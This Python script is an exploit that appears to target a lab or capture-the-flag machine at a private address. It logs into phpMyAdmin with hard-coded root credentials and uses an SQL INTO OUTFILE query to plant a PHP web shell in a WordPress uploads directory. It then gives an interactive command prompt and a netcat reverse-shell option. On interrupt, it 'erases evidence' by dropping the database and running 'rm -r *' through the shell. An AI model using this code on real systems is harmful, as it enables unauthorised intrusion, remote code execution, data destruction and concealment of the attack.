import requests,re,sys,random,string,urllib3,signal

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def signal_handler(sig, frame):
    global token, nocache,database_random
    print("\nexit")
    print("\n[!]Erasing evidence...")
    ### Eliminando evidencias...
    url_drop="https://192.168.56.8:12380/phpmyadmin/import.php"
    data_post={
        "is_js_confirmed":"0",
        "token":token,
        "pos":"0",
        "goto":"server_sql.php",
        "message_to_show":"Your+SQL+query+has+been+executed+successfully.",
        "prev_sql_query":"",
        "sql_query":"DROP DATABASE %s"%database_random,
        "bkm_label":"",
        "sql_delimiter":"%3B",
        "show_query":"1",
        "fk_checks":"0",
        "fk_checks":"1",
        "SQL":"Go",
        "ajax_request":"true",
        "ajax_page_request":"true",
        "_nocache":nocache
    }
    session.post(url_drop,data_post)
    url_elimited="https://192.168.56.8:12380/blogblog/wp-content/uploads/%s.php?cmd=rm -r *"%database_random
    session.get(url_elimited)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)



def login():
    ### Data
    username="root"
    password="plbkac"
    url_path="https://192.168.56.8:12380/phpmyadmin/"
    session=requests.Session()
    ##Verify False
    session.verify = False
    ## token
    cookie = session.get(url_path).text
    token =re.findall(r'<input type="hidden" name="token" value="(.*?)" /></fieldset>',cookie)[0]
    ### Login 
    data_post= {
        "pma_username":username,
        "pma_password":password,
        "server":"1",
        "target":"index.php",
        "token":token
    }
    response = session.post(url_path,data_post)
    if "<title>192.168.56.8:12380 / localhost | phpMyAdmin 4.5.4.1deb2ubuntu1</title>" in response.text:
        print("[!] Login successful")
        url_cookie="https://192.168.56.8:12380/phpmyadmin/server_databases.php?server=1&token=%s"%token
        session.get(url_cookie)
    else:
        print("[!]Error")
    
    return session,token

def create_database(session,token):
    ###Data cache
    url_cache=session.get("https://192.168.56.8:12380/phpmyadmin/server_databases.php?server=1&token=%s"%token).text
    nocache=re.findall(r'<link rel="stylesheet" type="text/css" href="phpmyadmin\.css\.php\?nocache=(.*?)" />', url_cache)[0] 
    ## Data create post database
    url_database="https://192.168.56.8:12380/phpmyadmin/import.php"
    data_post = {
        "is_js_confirmed":"0",
        "token":token,
        "pos":"0",
        "goto":"server_sql.php",
        "message_to_show":"Your+SQL+query+has+been+executed+successfully.",
        "prev_sql_query":"",
        "sql_query":"CREATE DATABASE %s"%database_random,
        "bkm_label":"",
        "sql_delimiter":"%3B",
        "show_query":"1",
        "fk_checks":"0",
        "fk_checks":"1",
        "SQL":"Go",
        "ajax_request":"true",
        "ajax_page_request":"true",
        "_nocache":nocache
    }
    session.post(url_database,data_post)
    return nocache
def sql_create(session,token,nocache):
    ### Create table 
    url_table="https://192.168.56.8:12380/phpmyadmin/import.php"
    data_post= {
        "is_js_confirmed":"0",
        "db":database_random,
        "token":token,
        "pos":"0",
        "goto":"db_sql.php",
        "message_to_show":"Your+SQL+query+has+been+executed+successfully.",
        "prev_sql_query":"",
        "sql_query":"SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"/var/www/https/blogblog/wp-content/uploads/%s.php \""%database_random,
        "bkm_label":"",
        "sql_delimiter":"%3B",
        "show_query":"1",
        "fk_checks":"0",
        "fk_checks":"1",
        "SQL":"Go",
        "ajax_request":"true","ajax_page_request":"true",
        "_nocache":nocache
    }
    session.post(url_table,data_post)

def shell_execution(session):
    print("HELP: reverse_shell Run a reverse shell")
    while True:
        command = input("_>")
        if command == "reverse_shell":
            ip = input("ip ->")
            port = input("port ->")
            url_reverse= f"https://192.168.56.8:12380/blogblog/wp-content/uploads/{database_random}.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E%2Ftmp%2Ff"
            session.get(url_reverse)

        url_exec="https://192.168.56.8:12380/blogblog/wp-content/uploads/%s.php?cmd=%s"%(database_random,command)
        print(session.get(url_exec).text)
 
    
if __name__ == "__main__":
    
    proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
    database_random=''.join(random.choice(string.ascii_letters) for _ in range(5)) 
    session,token=login()
    nocache=create_database(session,token)
    sql_create(session,token,nocache)
    shell_execution(session)
